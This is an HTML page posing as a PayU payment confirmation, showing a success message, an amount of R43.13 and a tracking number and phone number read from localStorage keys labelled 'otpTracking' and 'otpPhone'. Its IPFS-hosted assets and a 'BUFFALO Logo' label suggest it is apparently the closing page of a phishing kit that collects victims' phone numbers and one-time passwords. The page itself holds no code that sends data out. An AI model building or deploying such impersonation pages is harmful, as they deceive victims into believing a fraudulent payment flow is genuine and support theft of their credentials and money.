<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Payment Confirmation - PayU</title>
<link rel="icon" href="https://ipfs.io/ipfs/bafkreigr3lfqslffgr7rp35wxddzcvd7bbhzisacqc54ol2spqgmlkqb54">
<style>
    body {
        margin:0; 
        font-family: Arial, sans-serif; 
        background:#fff; 
        color:#444; 
        display:flex; 
        flex-direction:column; 
        min-height:100vh;
    }

    .top-logo {
        text-align:right; 
        padding:15px 25px;
    }
    .top-logo img {height:30px;}

    .center-wrapper {
        width:100%; 
        padding:40px 0; 
        display:flex; 
        justify-content:center; 
        flex:1;
    }

    .box {
        width:90%; 
        max-width:550px; 
        background:#fff; 
        border:1px solid #ddd; 
        border-radius:8px; 
        padding:40px 20px; 
        text-align:center; 
        box-shadow:0 2px 6px rgba(0,0,0,0.1);
    }

    .checkmark {
        font-size:50px;
        color:#4CAF50;
        margin-bottom:20px;
    }

    .confirmation-text {
        font-size:16px;
        color:#333;
        margin-bottom:15px;
    }

    .info-text {
        font-size:14px;
        color:#555;
        margin-top:10px;
    }

    /* Footer box */
    .footer-box {
        width:90%;
        max-width:800px;
        background:#f9f9f9;
        border:1px solid #ccc;
        border-radius:8px;
        padding:20px;
        margin:20px auto 40px auto;
        font-size:12px;
        line-height:1.5;
        color:#555;
        text-align:center;
        box-shadow:0 1px 4px rgba(0,0,0,0.1);
    }

    .footer-box .icons img {height:28px; margin:10px 8px;}

    @media (max-width:600px) {
        .top-logo {text-align:center;}
        .box {padding:30px 15px;}
        .footer-box {padding:15px 10px;}
    }
</style>
</head>
<body>

<div class="top-logo">
    <img src="https://ipfs.io/ipfs/bafkreift76igpyooavjbhnueqp2pdn5a3q3iczjmp5smq6d2vdxqc2uxsq" alt="BUFFALO Logo">
</div>

<div class="center-wrapper">
    <div class="box">
        <div class="checkmark">✔</div>
        <p class="confirmation-text">Your payment has been successfully processed!</p>
        <p class="info-text">Thank you for your transaction. You will receive a confirmation email shortly.</p>
        <p class="info-text">Tracking Number: <strong id="tracking-number">---</strong></p>
        <p class="info-text">Phone: <strong id="phone-number">---</strong></p>
        <p class="confirmation-text">Amount : R43.13</p>

    </div>
</div>

<div class="footer-box">
    <div class="icons">
        <img src="https://ipfs.io/ipfs/bafkreibf6miu22z2u4wl5l6wrztnyuujvrqsdxpymg3iorxs6a5hpr3jyu">
        <img src="https://ipfs.io/ipfs/bafkreidqow4mer5werjkju53tsjziwkoknojzqeoznxp2r2qbdxhvosavu">
    </div>
    <p>
        You agree that your personal data will be processed when you choose a payment method and proceed with a transaction. We may share your personal data with entities involved in processing your transaction. Depending on the payment method you choose, this can include banks, merchants, EFT providers, payment schemes, loan institutions or loyalty points providers. Providing personal data is a choice by you. If you choose not to provide your personal data, your transaction may be rejected. For information on how we process your personal data and your rights, see our PayU Privacy Statement. For information on our terms, compliance and security standards, see our Legal Information.
    </p>
    <p>All Rights Reserved ©2024</p>
</div>

<script>
/* Load tracking number and phone from localStorage */
const tracking = localStorage.getItem("otpTracking") || "---";
const phone = localStorage.getItem("otpPhone") || "---";

document.getElementById("tracking-number").textContent = tracking;
document.getElementById("phone-number").textContent = phone;
</script>

</body>
</html>
